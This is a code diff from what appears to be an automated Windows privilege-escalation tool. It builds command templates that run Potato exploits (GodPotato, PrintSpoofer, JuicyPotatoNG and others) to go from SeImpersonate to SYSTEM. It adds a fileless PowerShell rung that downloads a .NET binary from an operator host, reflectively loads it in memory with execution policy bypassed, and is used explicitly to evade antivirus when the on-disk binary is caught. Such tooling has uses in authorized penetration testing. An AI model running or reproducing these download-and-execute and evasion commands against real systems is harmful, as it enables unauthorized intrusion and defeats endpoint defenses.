@@ -267,50 +267,70 @@ WIN_GROUPS = {
 _IMPERSONATION_PRIVS = {"SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"}
 
 #: The Potato *tools* — each a different binary/technique/AV-signature over a different span
-#: of Windows. Each yields TWO rungs generated below: a native ``.exe`` (auto-staged to disk)
-#: and a fileless ``.ps1`` equivalent (served over HTTP + IEX'd in memory). A functional miss
-#: advances to the next tool; an AV catch on the on-disk method climbs to the ps1 rungs.
-#: (slug, tool, exe-args, ps1-invocation-after-IEX, note). The ps1 invocation mirrors the .exe
-#: args — adjust to your Invoke-<Tool>.ps1 wrapper if it differs.
+#: of Windows. Every tool yields a native ``.exe`` rung (auto-staged to disk); the .NET tools
+#: (``dotnet=True``) additionally yield a fileless ``.ps1`` rung — the same compiled ``.exe``
+#: served over HTTP and reflectively loaded into memory (``[Reflection.Assembly]::Load`` +
+#: ``EntryPoint.Invoke``), so nothing touches disk and no separate ``Invoke-<Tool>.ps1``
+#: wrapper is needed. A functional miss advances to the next tool; an AV catch on the on-disk
+#: method climbs to the reflective rungs. The C++ tools (PrintSpoofer/JuicyPotatoNG) aren't
+#: .NET assemblies, so they have no reflective-load rung (native-exe only).
+#: (slug, tool, dotnet, args, note) — ``args`` is the argv list, rendered for the .exe and as
+#: a PowerShell ``string[]`` for the reflective ``EntryPoint.Invoke``.
 _POTATOES = (
-    ("godpotato", "GodPotato", '-cmd "cmd /c whoami"',
-     "Invoke-GodPotato -Cmd 'cmd /c whoami'",
+    ("godpotato", "GodPotato", True, ["-cmd", "cmd /c whoami"],
      "GodPotato (RPC/DCOM, .NET) — broad: Server 2012–2022, Win8–11."),
-    ("printspoofer", "PrintSpoofer", '-c "cmd /c whoami"',
-     "Invoke-PrintSpoofer -c 'cmd /c whoami'",
+    ("printspoofer", "PrintSpoofer", False, ["-c", "cmd /c whoami"],
      "PrintSpoofer abuses the Print Spooler named pipe — Server 2016–2019, Win10."),
-    ("juicypotatong", "JuicyPotatoNG",
-     '-t * -p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
-     "Invoke-JuicyPotatoNG -t * -p C:\\Windows\\System32\\cmd.exe -a '/c whoami'",
-     "JuicyPotatoNG (DCOM) — the modern JuicyPotato successor."),
-    ("sweetpotato", "SweetPotato",
-     '-p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
-     "Invoke-SweetPotato -p C:\\Windows\\System32\\cmd.exe -a '/c whoami'",
-     "SweetPotato bundles several coercion techniques — a good fallback."),
-    ("efspotato", "SharpEfsPotato",
-     '-p C:\\Windows\\System32\\cmd.exe -a "/c whoami"',
-     "Invoke-SharpEfsPotato -p C:\\Windows\\System32\\cmd.exe -a '/c whoami'",
-     "SharpEfsPotato abuses EFSRPC (MS-EFSR) — works where the spooler is disabled."),
+    ("juicypotatong", "JuicyPotatoNG", False,
+     ["-t", "*", "-p", "C:\\Windows\\System32\\cmd.exe", "-a", "/c whoami"],
+     "JuicyPotatoNG (DCOM, C++) — the modern JuicyPotato successor."),
+    ("sweetpotato", "SweetPotato", True,
+     ["-p", "C:\\Windows\\System32\\cmd.exe", "-a", "/c whoami"],
+     "SweetPotato (.NET) bundles several coercion techniques — a good fallback."),
+    ("efspotato", "SharpEfsPotato", True,
+     ["-p", "C:\\Windows\\System32\\cmd.exe", "-a", "/c whoami"],
+     "SharpEfsPotato (.NET) abuses EFSRPC (MS-EFSR) — works where the spooler is disabled."),
 )
 
-WIN_IMPERSONATION = tuple(   # native .exe rungs — auto-staged to disk
-    dict(key=f"seimpersonate:{slug}", delivery="native-exe", detection="moderate",
-         title=f"SeImpersonate → SYSTEM ({tool})",
-         needs=f"{tool}.exe staged in {{stage}}",
-         command=f'{{stage}}\\{tool}.exe {exe_args}', cleanup=f"del {{stage}}\\{tool}.exe",
-         stages=((tool, f"{{stage}}\\{tool}.exe"),), detail=note)
-    for slug, tool, exe_args, _ps, note in _POTATOES
-) + tuple(   # ps1 rungs — the fileless equivalent of each: served over HTTP + IEX'd
-    dict(key=f"seimpersonate:ps-{slug}", delivery="inmem-fileless", detection="moderate",
-         title=f"SeImpersonate → SYSTEM ({tool}, in-memory IEX)",
-         needs=f"Invoke-{tool}.ps1 in the arsenal + a reachable lhost (config set lhost=)",
-         command=f"powershell -ep bypass -c \"IEX(New-Object Net.WebClient)."
-                 f"DownloadString('{{url}}Invoke-{tool}.ps1'); {ps_invoke}\"",
-         cleanup=None, shell="cmd", serves=(f"Invoke-{tool}.ps1",),
-         detail=f"IEX the {tool} PowerShell wrapper in memory — nothing lands on disk, so "
-                f"the on-disk EXE signature is moot. Served over HTTP while it runs.")
-    for slug, tool, _exe_args, ps_invoke, _note in _POTATOES
-)
+
+def _exe_arg(a):
+    """Render one argv token for a Windows command line (quote only if it has spaces)."""
+    return f'"{a}"' if " " in a else a
+
+
+def _ps_array(args):
+    """Render an argv list as a PowerShell single-quoted ``string[]`` element list."""
+    return ",".join("'" + a.replace("'", "''") + "'" for a in args)
+
+
+def _impersonation_ladder():
+    rungs = []
+    for slug, tool, dotnet, args, note in _POTATOES:
+        rungs.append(dict(   # native .exe — auto-staged to disk
+            key=f"seimpersonate:{slug}", delivery="native-exe", detection="moderate",
+            title=f"SeImpersonate → SYSTEM ({tool})",
+            needs=f"{tool}.exe staged in {{stage}}",
+            command=f"{{stage}}\\{tool}.exe " + " ".join(_exe_arg(a) for a in args),
+            cleanup=f"del {{stage}}\\{tool}.exe",
+            stages=((tool, f"{{stage}}\\{tool}.exe"),), detail=note))
+        if dotnet:
+            rungs.append(dict(   # fileless — serve the same .exe, reflectively load in memory
+                key=f"seimpersonate:ps-{slug}", delivery="inmem-fileless", detection="moderate",
+                title=f"SeImpersonate → SYSTEM ({tool}, in-memory reflective load)",
+                needs=f"{tool} in the arsenal + a reachable lhost (config set lhost=)",
+                command=("powershell -ep bypass -c \"$a=[Reflection.Assembly]::Load("
+                         "(New-Object Net.WebClient).DownloadData('{url}{served}'));"
+                         f"$a.EntryPoint.Invoke($null,@(,[string[]]@({_ps_array(args)})))\""),
+                cleanup=None, shell="cmd", serves=(tool,),
+                detail=f"reflectively load {tool}.exe in memory (served over HTTP) and invoke "
+                       "its entry point — the .NET assembly never touches disk, so the on-disk "
+                       "signature is moot. The loop climbs here when the on-disk Potato is "
+                       "caught. (Equivalent to an Invoke-{tool}.ps1 wrapper, but reuses the "
+                       "compiled .exe rather than needing a separate script.)"))
+    return tuple(rungs)
+
+
+WIN_IMPERSONATION = _impersonation_ladder()
 
 
 def _impersonation_vector(spec, ctx, evidence):
